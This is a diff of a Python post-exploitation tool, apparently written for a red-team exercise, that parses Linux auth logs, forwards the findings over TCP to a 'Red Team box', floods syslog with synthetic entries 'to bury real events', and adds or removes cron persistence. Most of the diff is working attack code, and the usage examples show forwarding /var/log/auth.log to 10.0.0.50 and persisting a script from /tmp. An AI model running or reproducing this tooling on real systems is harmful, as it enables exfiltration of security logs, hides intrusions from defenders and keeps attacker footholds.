@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # Seonho Park, scp4941@rit.edu
 
-import os, re, sys, json, time, socket, argparse, hashlib, threading, subprocess, pwd, grp
+import os, re, sys, json, time, socket, argparse, hashlib, threading, subprocess, pwd, grp, signal
 from datetime import datetime, timezone
 from pathlib import Path
 from collections import defaultdict
@@ -93,7 +93,19 @@ FAIL_RE = re.compile(
     re.I,
 )
 PORT_RE = re.compile(r"\bport\s+(\d{1,5})\b", re.I)
-SERVICE_RE = re.compile(r"^([a-zA-Z0-9\-_]+)(?:\[|\:)", re.I)
+SERVICE_RE = re.compile(r"\b([a-zA-Z0-9_-]+)\[(\d+)\]:")
+
+def extract_users(line: str) -> list:
+    """Extract deduplicated usernames from a syslog line."""
+    seen  = set()
+    users = []
+    for match in USER_RE.finditer(line):
+        for group in match.groups():
+            if group and group not in seen:
+                seen.add(group)
+                users.append(group)
+                break
+    return users
 
 def analyze(paths, keywords):
     """
@@ -102,31 +114,43 @@ def analyze(paths, keywords):
     """
     findings = []
 
-    for path, line in read_logs(paths):
-        ips = IP_RE.findall(line)
-        users = USER_RE.findall(line)
-        ports = PORT_RE.findall(line)
-        service_match = SERVICE_RE.match(line)
-        service = (service_match.group(1),) if service_match else None
-        flags = []
-        kws = [k for k in keywords if k.lower() in line.lower()]
+    for path in paths:
+        if not os.path.isfile(path) or not os.access(path, os.R_OK):
+            continue
+        try:
+            with open(path, "r", errors="ignore") as fh:
+                for raw_line in fh:
+                    line = raw_line.strip()
+                    if not line:
+                        continue
 
-        if FAIL_RE.search(line):
-            flags.append("auth_failure_or_error")
+                    matched_kw = [kw for kw in keywords if kw.lower() in line.lower()]
+                    ips        = IP_RE.findall(line)
+                    users      = extract_users(line)
+                    ports      = PORT_RE.findall(line)
+                    flags      = []
 
-        if ips or users or kws or flags:
-            findings.append({
-                "source": path,
-                "line": line,
-                "time": datetime.utcnow().isoformat(),
-                "ips": ips,
-                "users": users,
-                "ports": ports,
-                "service": service,
-                "keywords": kws,
-                "flags": flags,
-                "hash": hashlib.sha256(line.encode()).hexdigest()
-            })
+                    svc_m   = SERVICE_RE.search(line)
+                    service = [svc_m.group(1), svc_m.group(2)] if svc_m else None
+
+                    if FAIL_RE.search(line):
+                        flags.append("auth_failure_or_error")
+
+                    if matched_kw or ips or users or flags:
+                        findings.append({
+                            "source":    path,
+                            "line":      line,
+                            "timestamp": datetime.now(timezone.utc).isoformat(),
+                            "ips":       ips,
+                            "users":     users,
+                            "ports":     ports,
+                            "service":   service,
+                            "keywords":  matched_kw,
+                            "flags":     flags,
+                            "hash":      hashlib.sha256(line.encode()).hexdigest(),
+                        })
+        except OSError:
+            continue
 
     return findings
 
@@ -208,82 +232,157 @@ def summarize(findings: list) -> dict:
 # ---------------- FORWARD ----------------
 
 class Forwarder:
-    def __init__(self, host, port):
-        self.host = host
-        self.port = port
+    """
+    Lightweight TCP log forwarder.
 
-    def send(self, data):
-        sent = 0
+    Sends each finding as a newline-delimited JSON record prefixed with a
+    4-byte big-endian length header.  Also works with a plain `nc -l <port>`
+    listener on the receiving end for quick testing.
+    """
+
+    def __init__(self, host: str, port: int, timeout: int = 10):
+        self.host    = host
+        self.port    = port
+        self.timeout = timeout
+
+    def connect(self) -> socket.socket:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(self.timeout)
+        sock.connect((self.host, self.port))
+        return sock
+
+    def send(self, findings: list) -> tuple:
+        """Send *findings* to the remote collector. Returns (sent, failed)."""
+        sent = failed = 0
         try:
-            sock = socket.create_connection((self.host, self.port), timeout=5)
-        except Exception as e:
-            print("[-] Connection failed:", e)
-            return
+            sock = self.connect()
+        except (ConnectionRefusedError, OSError) as exc:
+            print(f"[-] Cannot connect to {self.host}:{self.port} — {exc}")
+            return 0, len(findings)
 
         with sock:
-            for d in data:
+            for finding in findings:
                 try:
-                    payload = json.dumps(d).encode()
+                    payload = (json.dumps(finding) + "\n").encode()
                     sock.sendall(len(payload).to_bytes(4, "big") + payload)
                     sent += 1
-                except:
+                except OSError as exc:
+                    print(f"[-] Send error: {exc}")
+                    failed += 1
                     break
 
-        print(f"[+] Sent {sent} records")
+        return sent, failed
 
-# ---------------- SERVER ----------------
+    def send_raw_lines(self, entries: list) -> tuple:
+        """Wrap raw (path, line) entries in a JSON envelope and forward."""
+        now = datetime.now(timezone.utc).isoformat()
+        return self.send([
+            {"source": p, "line": l, "timestamp": now}
+            for p, l in entries
+        ])
+    
+# ---------------- Server ----------------
 
+    
 class Server:
-    def __init__(self, host, port, folder):
-        self.host = host
-        self.port = port
-        self.folder = folder
-        self.buffer = []
-        self.lock = threading.Lock()
+    """
+    TCP server that receives forwarded log entries and writes them to disk.
 
-    def handle(self, conn):
-        raw = b""
-        while True:
-            chunk = conn.recv(4096)
-            if not chunk:
-                break
-            raw += chunk
+    Multi-threaded: several target boxes can connect simultaneously.
+    Handles SIGTERM and SIGINT for graceful shutdown.
 
-        for line in raw.split(b"\n"):
-            try:
-                data = json.loads(line.strip())
-                with self.lock:
-                    self.buffer.append(data)
-            except:
-                pass
+    Run on your Red Team Linux box:
+        python3 log_flooder.py --serve --bind 0.0.0.0 --port 5140
+    """
 
-        conn.close()
+    def __init__(self, host: str, port: int, storage_dir: Path):
+        self.host        = host
+        self.port        = port
+        self.storage_dir = storage_dir
+        self.lock       = threading.Lock()
+        self.buffer     = []
+        self.running    = False
+
+    def handle_client(self, conn: socket.socket, addr: tuple) -> None:
+        print(f"[+] Connection from {addr[0]}:{addr[1]}")
+        received = 0
+        try:
+            with conn:
+                raw = b""
+                while True:
+                    chunk = conn.recv(4096)
+                    if not chunk:
+                        break
+                    raw += chunk
+
+                for record in raw.split(b"\n"):
+                    record = record.strip()
+                    if not record:
+                        continue
+                    # Strip 4-byte length prefix if present.
+                    if len(record) >= 4:
+                        try:
+                            length = int.from_bytes(record[:4], "big")
+                            if length == len(record) - 4:
+                                record = record[4:]
+                        except Exception:
+                            pass
+                    try:
+                        with self.lock:
+                            self.buffer.append(json.loads(record))
+                        received += 1
+                    except json.JSONDecodeError:
+                        continue
+        except OSError:
+            pass
+
+        print(f"[+] {addr[0]}: received {received} entries")
         self.flush()
 
-    def flush(self):
+    def flush(self) -> None:
         with self.lock:
             if not self.buffer:
                 return
-            data = self.buffer[:]
+            batch = self.buffer[:]
             self.buffer.clear()
+        outfile = save_findings(batch, self.storage_dir)
+        print(f"[+] Saved {len(batch)} entries → {outfile}")
 
-        file = save_findings(data, self.folder)
-        print(f"[+] Saved {len(data)} → {file}")
-
+    def stop(self, signum, frame) -> None:
+        print("\n[+] Signal received — stopping server …")
+        self.running = False
+        
     def run(self):
-        s = socket.socket()
-        s.bind((self.host, self.port))
-        s.listen()
+        self.running = True
+        signal.signal(signal.SIGTERM, self.stop)
+        signal.signal(signal.SIGINT,  self.stop)
 
-        print(f"[+] Server on {self.host}:{self.port}")
+        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        srv.bind((self.host, self.port))
+        srv.listen(32)
+        srv.settimeout(1.0)   # allows SIGINT to be caught promptly
+        print(f"[+] Collection server listening on {self.host}:{self.port}")
+        print(f"[+] Writing to {self.storage_dir}  (Ctrl-C to stop)")
 
-        while True:
-            conn, _ = s.accept()
-            threading.Thread(target=self.handle, args=(conn,), daemon=True).start()
+        while self.running:
+            try:
+                conn, addr = srv.accept()
+                threading.Thread(
+                    target=self.handle_client, args=(conn, addr), daemon=True
+                ).start()
+            except socket.timeout:
+                continue
+            except OSError:
+                break
+
+        srv.close()
+        self.flush()
+        print("[+] Server stopped.")
 
 # ---------------- FLOOD ----------------
 
-def _setup_syslog_logger() -> logging.Logger:
+def setup_syslog_logger() -> logging.Logger:
     """
     Configure a logger that writes to /dev/log (Linux syslog Unix socket).
     rsyslog and syslog-ng both listen on this socket on all major distros.
@@ -296,7 +395,7 @@ def _setup_syslog_logger() -> logging.Logger:
     return logger
 
 
-def flood_logs(rate: int, duration: int) -> None:
+def flood_logs(rate: int, duration: int):
     """
     Write synthetic syslog entries at a controlled rate to bury real events.
 
@@ -305,7 +404,7 @@ def flood_logs(rate: int, duration: int) -> None:
     """
     rate     = min(rate, MAX_RATE)
     duration = min(duration, MAX_DURATION)
-    logger   = _setup_syslog_logger()
+    logger   = setup_syslog_logger()
     interval = 1.0 / rate
     deadline = time.monotonic() + duration
     counter  = 0
@@ -333,7 +432,7 @@ def flood_logs(rate: int, duration: int) -> None:
 
 # ---------------- CRON ----------------
 
-def _python_bin() -> str:
+def python_bin() -> str:
     """
     Resolve the interpreter path from /proc/self/exe so we always persist the
     exact binary currently running, not a possibly different PATH entry.
@@ -349,7 +448,7 @@ def persist(script_path: str) -> bool:
     OpSec: crontab -l is visible to all users; remove with --unpersist
     before cleanup.
     """
-    cron_job = f"*/5 * * * * {_python_bin()} {script_path}\n"
+    cron_job = f"*/5 * * * * {python_bin()} {script_path}\n"
     try:
         result  = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
         current = result.stdout if result.returncode == 0 else ""
@@ -373,7 +472,7 @@ def unpersist(script_path: str) -> bool:
     """
     Remove the cron entry added by create_cron_persistence (cleanup).
     """
-    cron_job = f"*/5 * * * * {_python_bin()} {script_path}\n"
+    cron_job = f"*/5 * * * * {python_bin()} {script_path}\n"
     try:
         result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
         if result.returncode != 0:
@@ -397,21 +496,21 @@ def build_parser() -> argparse.ArgumentParser:
         epilog="""
 Examples:
   # Collect & analyse auth log, save, and forward to RT box:
-  python3 log_tool.py --collect --keywords failed sudo root \\
+  python3 log_flooder.py --collect --keywords failed sudo root \\
       --logs /var/log/auth.log --save --forward 10.0.0.50
 
   # Run collection server on RT box:
-  python3 log_tool.py --serve --bind 0.0.0.0 --port 5140
+  python3 log_flooder.py --serve --bind 0.0.0.0 --port 5140
 
   # Generate syslog noise (root required):
-  sudo python3 log_tool.py --flood --rate 20 --duration 60
+  sudo python3 log_flooder.py --flood --rate 20 --duration 60
 
   # Summarise all stored findings:
-  python3 log_tool.py --summary
+  python3 log_flooder.py --summary
 
   # Add / remove cron persistence:
-  python3 log_tool.py --persist /tmp/log_tool.py
-  python3 log_tool.py --unpersist /tmp/log_tool.py
+  python3 log_flooder.py --persist /tmp/log_flooder.py
+  python3 log_flooder.py --unpersist /tmp/log_flooder.py
 """,
     )
     
@@ -464,7 +563,7 @@ def main():
     storage_dir = Path(args.storage_dir)
     ui = current_user_info()
 
-    print(f"[+] log_tool.py | user={ui['user']} uid={ui['uid']} | Linux")
+    print(f"[+] log_flooder.py | user={ui['user']} uid={ui['uid']} | Linux")
 
     if args.raw:
         print("[+] Reading raw log entries …")
